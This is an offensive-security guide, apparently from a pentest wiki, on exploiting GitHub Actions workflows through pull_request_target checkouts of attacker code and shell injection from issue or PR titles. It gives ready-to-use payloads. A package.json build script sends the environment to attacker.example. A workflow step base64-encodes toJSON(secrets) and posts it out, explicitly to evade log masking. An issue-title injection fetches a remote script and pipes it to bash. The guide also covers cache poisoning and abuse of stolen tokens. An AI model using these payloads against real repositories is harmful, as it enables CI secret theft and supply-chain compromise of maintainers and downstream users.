---
title: "Actions workflow injection: running attacker code in a privileged CI pipeline"
description: "Turning GitHub Actions into code execution through pull_request_target and workflow_run triggers that check out attacker PR code with a read-write GITHUB_TOKEN, and shell script injection from untrusted context expressions, with secret exfiltration and cache poisoning."
keywords:
  - pull_request_target
  - workflow_run
  - script injection
  - GITHUB_TOKEN
  - poisoned pipeline execution
---

# Actions workflow injection

GitHub Actions runs code defined in `.github/workflows/*.yml` in response to repository events. Two design facts make it an execution target from the outside: some triggers run the workflow **from the base repo with a privileged token while checking out the attacker's code**, and workflow files **interpolate untrusted event text directly into shell**. Either one turns a pull request or an issue into code execution with the repo's secrets in reach.

## Fingerprint first

Read the workflows before touching anything. The dangerous markers:

```bash
gh api /repos/ACME/service/contents/.github/workflows -q '.[].name'
for f in $(gh api /repos/ACME/service/contents/.github/workflows -q '.[].path'); do
  gh api "/repos/ACME/service/contents/$f" -q '.content' | base64 -d
done | grep -nE 'pull_request_target|workflow_run|github\.event\.(issue|pull_request|comment)|actions/checkout.*ref|self-hosted'
```

- `pull_request_target` or `workflow_run` plus an explicit checkout of the PR head means **class A** (privileged context running your code).
- `${{ github.event.* }}` landing inside a `run:` block means **class B** (script injection).
- `permissions:` absent, or `contents: write`/`id-token: write`, raises the payoff.

## Class A: pull_request_target running attacker code

`pull_request` from a fork runs with a **read-only** `GITHUB_TOKEN` and no secrets, by design. `pull_request_target`, however, runs in the context of the **base** repository: read-write `GITHUB_TOKEN`, full access to `secrets`, but it checks out the base code by default. The vulnerability is a workflow that explicitly checks out the PR head and then builds or runs it:

```yaml
# Vulnerable workflow in the TARGET repo (.github/workflows/label.yml)
on:
  pull_request_target:          # runs with base-repo secrets + write token
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checks out MY code
      - run: npm install && npm run build                   # runs MY package.json scripts
```

You do not control the workflow, only the PR. Open a PR from a fork whose `package.json` (or any script the pipeline invokes) carries the payload:

```json
{
  "scripts": {
    "build": "env | base64 | curl -s -d @- https://attacker.example/x"
  }
}
```

When maintainers' automation triggers the workflow, your `build` runs with the base repo's environment, which includes a write-capable `GITHUB_TOKEN` and injected secrets.

## Dumping the secrets

Inside a privileged run, every secret is reachable through the `secrets` context. The reliable exfil is to serialize and ship them, base64-wrapped so newlines survive:

```yaml
      - name: collect
        run: |
          echo '${{ toJSON(secrets) }}' | base64 -w0 | curl -s -X POST --data-binary @- https://attacker.example/s
          echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/t
```

`toJSON(secrets)` dumps the entire secret map in one expression. GitHub masks known secret strings in logs, which is exactly why you exfiltrate rather than print: base64 encoding breaks the masker's literal match, and the data leaves the runner intact.

## Class B: script injection from context expressions

When an untrusted field is interpolated into a `run:` step, GitHub substitutes the raw text **before** the shell parses the line, so shell metacharacters in that text execute. The classic sinks are issue titles, PR titles and bodies, comment bodies, and branch names:

```yaml
# Vulnerable step
      - run: echo "New issue: ${{ github.event.issue.title }}"
```

Create an issue whose title is a command substitution and the runner executes it:

```
Title:  foo"; curl -s https://attacker.example/p.sh | bash; echo "
```

After substitution the step becomes `echo "New issue: foo"; curl ... | bash; echo ""`, and your script runs with the workflow's token and secrets. The same payload works in a PR body, a review comment, or a crafted branch name reflected into a step.

A quieter variant stages the payload through an environment variable but still breaks out if the value reaches a shell unquoted; the fix maintainers skip is quoting, which is why any unquoted `${{ ... }}` in `run:` is a candidate.

## Variants and follow-on

- **Poisoned pipeline execution (PPE)**: where you can push to a branch the CI trusts, or edit the workflow itself in a PR that a less-restricted trigger runs, you modify the pipeline directly rather than smuggling code through it. Direct-PPE edits the workflow in-repo; indirect-PPE poisons a file the pipeline reads (a `Makefile`, a test script, a dependency lockfile).
- **Cache and artifact poisoning**: a low-privileged `pull_request` job can write to the Actions cache. A later privileged workflow that restores that cache key executes your planted content. Likewise, artifacts uploaded by an untrusted job and consumed by a trusted one carry your payload across the privilege boundary.
- **Follow-on**: the `GITHUB_TOKEN` you capture can push commits and tags, create releases, and (with `id-token: write`) mint an OIDC token to assume a cloud role. Route it to [token and GITHUB_TOKEN abuse](token-and-github-token-abuse.md). Secrets dumped from the run (deploy keys, registry tokens, cloud keys) feed lateral movement and supply-chain pushes to downstream consumers.

## Exploitation notes

- Confirm the trigger: `pull_request` from a fork is near-harmless; `pull_request_target` and `workflow_run` are the privileged ones. The checkout `ref` tells you whether your code actually runs.
- Base64-encode exfiltrated secrets; the log masker only catches literal known strings.
- `toJSON(secrets)` is the single-shot dump; `toJSON(github)` and `env` reveal the rest of the run context including the token path.
- On GHES the same triggers behave identically; self-hosted runners (the default there) escalate Class A into host RCE, see [self-hosted runner takeover](self-hosted-runner-takeover.md).

## Tools

- **gato** (Praetorian): enumerates org/repo workflows for injectable and self-hosted-runner conditions and can push PoC workflows.
- **actionlint**: static linter whose findings double as a map of injectable context expressions.
- **nektos/act**: run a target workflow locally to develop and test a payload offline.

## References

- [GitHub: security hardening, untrusted input](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [Synacktiv: GitHub Actions exploitation (pull_request_target)](https://www.synacktiv.com/en/publications/github-actions-exploitation-untrusted-input.html)
- [Praetorian: gato and the Actions attack surface](https://github.com/praetorian-inc/gato)
- [GitHub Security Lab: keeping your GitHub Actions and workflows secure](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [Adnan Khan: cache poisoning in GitHub Actions](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/)
